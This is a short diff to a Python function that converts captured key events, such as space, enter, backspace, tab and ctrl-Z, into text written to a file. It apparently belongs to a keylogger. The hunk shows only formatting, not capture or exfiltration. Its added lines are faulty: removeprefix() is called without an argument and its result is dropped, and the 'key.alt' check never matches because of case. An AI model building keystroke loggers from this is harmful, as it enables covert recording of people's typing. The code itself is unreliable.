@@ -4,8 +4,14 @@ def writetofile(key):
     letter = str(key)
     # ======== key replace ========
     letter = letter.replace("'","")
-    letter = letter.replace("Key.space"," ")
-    letter = letter.replace("Key.enter","\n")
+    if letter == "key.alt":
+        letter = ""
+    if letter == "Key.space":
+        letter = " "
+    if letter == "Key.enter":
+        letter = "\n"
+    if letter == "Key.backspace":
+        letter.removeprefix()
     letter = letter.replace("Key.backspace"," (user press backspace) ")
     letter = letter.replace("Key.tab","\t")
     letter = letter.replace("Key.ctrlz "," (user press ctrlZ) ")
